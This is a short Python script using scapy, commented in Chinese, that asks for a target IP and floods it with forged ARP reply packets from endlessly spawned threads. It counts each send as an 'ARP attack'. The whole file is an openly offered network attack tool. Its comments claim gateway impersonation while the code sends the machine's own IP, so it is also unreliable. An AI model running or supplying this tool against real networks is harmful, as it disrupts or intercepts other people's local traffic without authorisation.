import os, uuid, socket
from scapy.all import *
from scapy.layers.l2 import ARP
from threading import Thread, Lock, activeCount

# 获取Mac地址
def get_mac_address():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

# 获取本机IP
def get_mac_ip():
    # 获取主机名
    hostname = socket.gethostname()
    # 获取IP
    ip = socket.gethostbyname(hostname)
    return ip


class Loop(Thread):
    def __init__(self, ip):
        Thread.__init__(self)
        self.ip = ip

    def run(self):
        # hacker_mac_address 在这里代表的是黑客的mac地址
        # 因为我们是去冒充网关，所以这个ip地址是我们的网关地址
        # enemy_mac_address 是我们需要对其进行攻击的一个mac地址
        # enemy_ip_address 是沃恩需要对其攻击的ip地址
        arp = ARP(
            op="2",
            hwsrc=get_mac_address(),        # 本机mac
            psrc=get_mac_ip(),              # 本机IP
            pdst=self.ip                   # 目标IP
        )
        srp(arp, verbose=0, retry=0, timeout=3)


class Main(Thread):
    def __init__(self, ip):
        Thread.__init__(self)
        self.ip = ip
    def run(self):
        limit = 100
        total = 0
        while True:
            if activeCount() < limit:
                Loop(self.ip).start()
                total += 1
            print('目前已进行了ARP攻击次数为：', str(total))

if __name__ == '__main__':
    ip = input('请输入要攻击的IP：')
    Main(ip=ip).start()
